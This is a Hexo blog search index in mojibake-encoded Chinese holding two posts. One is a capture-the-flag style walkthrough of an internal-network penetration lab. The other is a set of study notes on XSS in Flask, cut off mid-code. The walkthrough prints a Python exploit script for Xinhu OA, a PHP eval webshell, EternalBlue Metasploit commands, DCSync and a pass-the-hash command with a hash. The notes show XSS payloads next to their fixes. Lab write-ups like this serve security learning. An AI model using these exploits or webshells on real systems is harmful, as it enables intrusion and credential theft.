<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ_Initial</title>
    <link href="/2025/01/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83_Initial/"/>
    <url>/2025/01/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83_Initial/</url>
    
    <content type="html"><![CDATA[<p>å”‰ï¼Œå­¦</p><span id="more"></span><h3 id="0x01-Flag01"><a href="#0x01-Flag01" class="headerlink" title="0x01 Flag01"></a>0x01 Flag01</h3><p><img src="/img/image-20241230163501619-1735891210019-1.png" alt="image-20241230163501619"></p><p><code>39.99.229.166</code>ï¼Œæ£±é•œæ‰«ä¸‹å¸¸ç”¨ç«¯å£:</p><p><img src="/img/image-20241230163720929-1735891214172-3.png" alt="image-20241230163720929"></p><p>å¼€äº†<code>22</code>è¿˜æœ‰<code>80</code>ï¼Œ<code>80</code>æ˜¯ä¸ª<code>http</code>æœåŠ¡ã€‚<code>EZ</code>çœ‹æŒ‡çº¹æ²¡å•¥æ”¶è·ï¼Œ<code>fscan</code>æ‰«ï¼š</p><p><img src="/img/image-20250103103946225.png" alt="image-20250103103946225"></p><p><code>thinkphp5023RCE</code>ï¼Œç›´æ¥ç”¨å·¥å…·ï¼š</p><p><img src="/img/image-20241230170422244-1735891217007-5.png" alt="image-20241230170422244"></p><p>èšå‰‘è¿æ¥ï¼š</p><p><img src="/img/image-20241230170537852-1735891219844-7.png" alt="image-20241230170537852"></p><p>æ‰“å¼€ç»ˆç«¯åå‘ç°å½“å‰ç”¨æˆ·æ˜¯<code>www-data</code>ï¼Œè¿™ä¸ªç”¨æˆ·æƒé™æ¯”è¾ƒä½ã€‚å…ˆå°è¯•ææƒï¼Œå‘ç°ä»–è¿™ä¸ª<code>Mysql</code>å¼€äº†å…å¯†ç™»å½•ï¼Œç™»é™†åèƒ½ä»¥<code>root</code>èº«ä»½æ‰§è¡Œå‘½ä»¤(<code>mysql -e</code>)ï¼š</p><p><img src="/img/image-20241230172115168-1735891224751-9.png" alt="image-20241230172115168"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! find / -name flag*&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20241230172846788-1735891226886-11.png" alt="image-20241230172846788"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20241230172925606-1735891229292-13.png" alt="image-20241230172925606"></p><h3 id="0x02-Flag02"><a href="#0x02-Flag02" class="headerlink" title="0x02 Flag02"></a>0x02 Flag02</h3><p><code>ifconfig</code>çœ‹ç½‘ç»œä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/var/www/html) $ ifconfig<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255<br>        inet6 fe80::216:3eff:fe05:3164  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        ether 00:16:3e:05:31:64  txqueuelen 1000  (Ethernet)<br>        RX packets 128728  bytes 153547480 (153.5 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 35118  bytes 7563272 (7.5 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 1686  bytes 146020 (146.0 KB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 1686  bytes 146020 (146.0 KB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure><p>ç”¨èšå‰‘åœ¨åˆšæ‰ä¹‹å‰ä¼ é©¬é‚£ä¸ªç›®å½•ä¼ ä¸ª<code>fscan</code>ä¸Šå»ï¼š</p><p><img src="/img/image-20241231141011778.png" alt="image-20241231141011778"></p><p>ç»™æ‰§è¡Œæƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! chmod 777 /var/www/html/fscan*&#x27;</span><br></code></pre></td></tr></table></figure><p>æ‰«å†…ç½‘:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan_amd64 -h 172.22.1.0/24<br><span class="hljs-built_in">cat</span> result.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250103104235728.png" alt="image-20250103104235728"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.18:139</span> open<br><span class="hljs-number">172.22.1.2:139</span> open<br><span class="hljs-number">172.22.1.21:135</span> open<br><span class="hljs-number">172.22.1.18:135</span> open<br><span class="hljs-number">172.22.1.2:135</span> open<br><span class="hljs-number">172.22.1.18:80</span> open<br><span class="hljs-number">172.22.1.15:80</span> open<br><span class="hljs-number">172.22.1.18:3306</span> open<br><span class="hljs-number">172.22.1.21:445</span> open<br><span class="hljs-number">172.22.1.18:445</span> open<br><span class="hljs-number">172.22.1.2:445</span> open<br><span class="hljs-number">172.22.1.2:88</span> open<br><span class="hljs-number">172.22.1.21:139</span> open<br><span class="hljs-number">172.22.1.15:22</span> open<br><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>      <span class="hljs-string">[+]</span>DC DC01.xiaorang.lab             Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span> <br><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">15</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">5578</span>   title:Bootstrap Material Admin<br><span class="hljs-string">[*]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br>   <span class="hljs-string">[-&gt;]</span>DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN7<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span><br><span class="hljs-string">[*]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-OA01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>  (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None è·³è½¬url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>?m=login<br><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="hljs-number">2012</span> R2 Datacenter <span class="hljs-number">9600</span> <br><span class="hljs-string">[+]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span>    MS17-<span class="hljs-number">010</span>    (Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span>     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> <br><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>?m=login code:<span class="hljs-number">200</span> len:<span class="hljs-number">4012</span>   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ<br><span class="hljs-string">[+]</span> http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">15</span> poc-yaml-thinkphp5023-method-rce poc1<br></code></pre></td></tr></table></figure><p>è·å¾—å†…ç½‘ä¿¡æ¯ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.2</span>   DCåŸŸæ§<br><span class="hljs-number">172.22.1.21</span>  MS17-<span class="hljs-number">010</span>æ°¸æ’ä¹‹è“<br><span class="hljs-number">172.22.1.18</span>  ä¿¡å‘¼OAç³»ç»Ÿ<br></code></pre></td></tr></table></figure><p>å…ˆæ‰“è¿™ä¸ªä¿¡å‘¼OAï¼Œä¸è¿‡è¦æ­ä¸ªéš§é“è¿›å†…ç½‘(åˆ©ç”¨<code>frp+proxifier</code>)ã€‚å…ˆåˆ©ç”¨èšå‰‘ä¸Šä¼ <code>frpc</code>å’Œ<code>frpc.ini</code>:</p><p><img src="/img/image-20250103103233933.png" alt="image-20250103103233933"></p><p>å’Œä¸Šé¢çš„<code>fscan</code>ä¸€æ ·ï¼Œç»™æ‰§è¡Œæƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x frpc<br></code></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/weixin_63576152/article/details/133462540?spm=1001.2014.3001.5501">ä»£ç†é…ç½®</a></p><p>éƒ½é…ç½®å®Œå°±èƒ½è®¿é—®å†…ç½‘é‡Œçš„è¿™ä¸ªæœåŠ¡(<code>172.22.1.18</code>)äº†ï¼š</p><p><img src="/img/image-20250103170527505.png" alt="image-20250103170527505"></p><p>ç¢°åˆ°è¿™ç§æ²¡éªŒè¯ç çš„ç™»å½•æ¡†å…ˆå°è¯•å¼±å£ä»¤ã€‚<code>admin/admin123</code>å‘ç°èƒ½ç™»å½•ï¼š</p><p><img src="/img/image-20250103170600031.png" alt="image-20250103170600031"></p><p>è½¬äº†ä¸€åœˆå„¿ä¹Ÿä¸çŸ¥é“å’‹åˆ©ç”¨ï¼Œåé¢å‘ç°æœ‰ç°æˆçš„<code>exp</code>å¯ä»¥æ‰“:<a href="https://blog.csdn.net/solitudi/article/details/118675321">ä»£ç å®¡è®¡ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ2.2å­˜åœ¨æ–‡ä»¶ä¸Šä¼ é…åˆäº‘å¤„ç†å‡½æ•°ç»„åˆæ‹³RCE</a></p><p>å”‰ï¼Œè„šæœ¬å°å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br> <br>session = requests.session()<br> <br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br> <br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br> <br> <br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br> <br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br> <br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br> <br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ<code>1.php</code>çš„å†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>exp</code>è·‘å®Œè¾“å‡ºçš„æ˜¯å†™é©¬è¿›å»çš„è·¯å¾„(ä¸è¿‡è¦æ³¨æ„ä»–è¿™ä¸ªæ˜¯ç»å¯¹è·¯å¾„)ã€‚</p><p><img src="/img/image-20250103171435050.png" alt="image-20250103171435050"></p><p>ä½¿ç”¨èšå‰‘ä¹‹å‰é…ç½®ä¸‹ä»£ç†ï¼š</p><p><img src="/img/455d8e9e43ced978235032398a542623.png" alt="455d8e9e43ced978235032398a542623"></p><p>èšå‰‘è¿æ¥<code>https://172.22.1.18/upload+</code>åé¢é‚£ä¸€ä¸²å„¿ï¼šï¼Œ<code>flag</code>ä½äº<code>C://Users/Administrator/flag/flag02.txt</code>ï¼š</p><p><img src="/img/image-20250103171548839.png" alt="image-20250103171548839"></p><p>è·å¾—<code>flag02</code>åå®ƒæç¤ºæˆ‘ä»¬å»æ‰“åŸŸæ§ã€‚</p><h3 id="0x03-Flag03"><a href="#0x03-Flag03" class="headerlink" title="0x03 Flag03"></a>0x03 Flag03</h3><p>æœ€åæ‰“MS17-010ï¼Œéœ€è¦åˆ©ç”¨proxifier+msfæ”»å‡»</p><p>é¦–å…ˆé…ç½®ä¸€ä¸‹proxychainsï¼ˆæŠŠå…¬ç½‘æœåŠ¡å™¨ä½œä¸ºä»£ç†æ¥è¿›å…¥å†…ç½‘ï¼‰</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>proxychains.conf<br></code></pre></td></tr></table></figure><p>å”‰ï¼Œè„šæœ¬å°å­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure><p>æ‰“å®Œä¹‹åè·å¾—ä¸€ä¸ªæ­£å‘è¿æ¥çš„<code>shell</code>ï¼š</p><p><img src="/img/4a1787360a997a7aed633f20182a264a.png" alt="4a1787360a997a7aed633f20182a264a"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250106143548762.png" alt="image-20250106143548762"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250106143621461.png" alt="image-20250106143621461"></p><p>æ‹¿åˆ°ç®¡ç†å‘˜å“ˆå¸Œåæ‰“å“ˆå¸Œä¼ é€’ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains crackmapexec smb <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span> -u administrator -H<span class="hljs-number">10</span>cf<span class="hljs-number">89</span>a<span class="hljs-number">850</span>fb<span class="hljs-number">1</span>cdbe<span class="hljs-number">6</span>bb<span class="hljs-number">432</span>b<span class="hljs-number">859164</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span> -d xiaorang.lab -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/7b0b8313c4ee7d882a02161eebc7c09e.png" alt="7b0b8313c4ee7d882a02161eebc7c09e"></p><p>ä¸€è¾¹å­¦ä¸€éæ‰“ä¸€å…±èŠ±äº†äº”ä¸ªå¤šå°æ—¶ğŸ˜ª</p><p><img src="/img/image-20250106151323937.png" alt="image-20250106151323937"></p>]]></content>
    
    
    
    <tags>
      
      <tag>å†…ç½‘æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask/Djangoä¸­çš„XSS</title>
    <link href="/2024/09/01/XSS-in-FlaskDjango/"/>
    <url>/2024/09/01/XSS-in-FlaskDjango/</url>
    
    <content type="html"><![CDATA[<p>å­¦ä¹ ç¬”è®°</p><span id="more"></span><h3 id="0x01-ç¤ºä¾‹"><a href="#0x01-ç¤ºä¾‹" class="headerlink" title="0x01 ç¤ºä¾‹"></a>0x01 ç¤ºä¾‹</h3><p><code>Flask</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Guest&#x27;</span>)<br>    html = <span class="hljs-string">f&quot;&lt;h1&gt;Hello, <span class="hljs-subst">&#123;user_input&#125;</span>!&lt;/h1&gt;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(html)<br><span class="hljs-comment">#åå°„å‹</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>ä»¤<code>http://127.0.0.1:5000/?name=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>:</p><p><img src="/img/xss_1_1.png" alt="xss_1_1"></p><p>è¿™é‡Œç›´æ¥åˆ©ç”¨f-string è¿›è¡Œå­—ç¬¦ä¸²æ’å€¼ï¼Œuser_input çš„å€¼åœ¨æ’å€¼æ—¶ç›´æ¥è¿›å…¥äº†æœ€ç»ˆçš„ HTML è¾“å‡º</p><p>ç®€å•è¯´å°±æ˜¯ç”¨æˆ·çš„è¾“å…¥è¢«å½“æˆåˆæ³•çš„ HTML å’Œ JavaScriptæ‰§è¡Œå¯¼è‡´äº†æœªé¢„æœŸçš„è¡Œä¸º</p><p>è§£å†³æ–¹æ³•å°±æ˜¯åˆ©ç”¨<code>jinja2</code>æ¨¡æ¿æ¸²æŸ“ç”¨æˆ·çš„è¾“å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#åœ¨ Flask ä¸­ï¼Œé™¤éæ˜¾å¼æŒ‡æ˜ä¸è½¬ä¹‰ï¼ŒJinja2ä¼šè‡ªåŠ¨è½¬ä¹‰æ‰€æœ‰å€¼ã€‚è¿™æ ·å¯ä»¥æ’é™¤æ‰€æœ‰æ¨¡æ¿å¯¼è‡´çš„ XSS é—®é¢˜</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Guest&#x27;</span>)<br>    html = <span class="hljs-string">&quot;&lt;h1&gt;Hello, &#123;&#123; user_input &#125;&#125;!&lt;/h1&gt;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(html, user_input=user_input)<br></code></pre></td></tr></table></figure><p>è¿™æ—¶ä»¤<code>http://127.0.0.1:5000/?name=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ï¼š</p><p><img src="/img/xss_1_2.png" alt="xss_1_2"></p><p>çœ‹æºç ï¼š</p><p><img src="/img/xss_1_3.png" alt="xss_1_3"></p><p>å¯ä»¥çœ‹åˆ°<code>&lt;</code>, <code>&gt;</code>, <code>&#39;</code>éƒ½è¢«è½¬ä¹‰æˆäº†HTMLå®ä½“(ä¸æ˜¯HTMLè¯­æ³•çš„ä¸€éƒ¨åˆ†)ï¼Œæµè§ˆå™¨ä¸ä¼šå°†è¿™äº›å­—ç¬¦å½“ä½œ HTML æˆ– JavaScript æ¥æ‰§è¡Œ</p><p>è‡ªå·±å®šä¹‰è½¬ä¹‰ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡è¦æ³¨æ„çš„æ˜¯ä¸å…‰æ ‡ç­¾è¦åšè½¬ä¹‰ï¼Œå•å¼•å·å’ŒåŒå¼•å·åŒæ ·è¦åšè½¬ä¹‰ï¼Œè‹¥åªè½¬ç§»äº†æ ‡ç­¾ç¬¦å·ï¼Œç¡®å®æ²¡åŠæ³•ç›´æ¥æ’å…¥æ ‡ç­¾ï¼Œä¸è¿‡å¯¹äºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;?= avatar_url ?&gt;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&lt;?= nickname ?&gt;&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&lt;?= nickname ?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»¤<code>nickname = &quot; onload=&quot;alert(1)</code>å»é—­åˆ<code>alt</code>æ ‡ç­¾ï¼Œåˆ›é€ ä¸€ä¸ª<code>onload</code>å±æ€§ï¼ˆ<code>onload</code>å±æ€§å±äº<code>html</code>å±æ€§ï¼‰ï¼š</p><p><code>&lt;img src=&quot;avatar_url&quot; alt=&quot;&quot; onload=&quot;alert(1)&quot; /&gt;&lt;div&gt;&quot; onload=&quot;alert(1)&lt;/div&gt;</code></p><p>é‚£ä¹ˆå¦‚ä½•æ˜¾å¼æŒ‡æ˜ä¸è½¬ä¹‰å‘¢ï¼Ÿå¯ä»¥é€šè¿‡<code>|safe</code>æˆ–<code>Markup</code>å®ç°ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">#å­˜åœ¨xss.htmlï¼Œrender_template(&#x27;xss.html&#x27;, name=name)<br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Hello, &#123;&#123; name |safe &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name = Markup(request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>))<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€ç±» <code>XSS</code> é—®é¢˜ <code>Jinja</code> çš„è½¬ä¹‰æ— æ³•é˜»æ­¢ã€‚ <code>a</code> æ ‡è®°çš„ <code>href</code> å±æ€§å¯ä»¥åŒ…å«ä¸€ä¸ª <code>javascript: URI</code> ã€‚å¦‚æœæ²¡æœ‰æ­£ç¡®ä¿æŠ¤ï¼Œé‚£ä¹ˆå½“ç‚¹å‡»å®ƒæ—¶æµè§ˆå™¨å°†æ‰§è¡Œå…¶ä»£ç ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 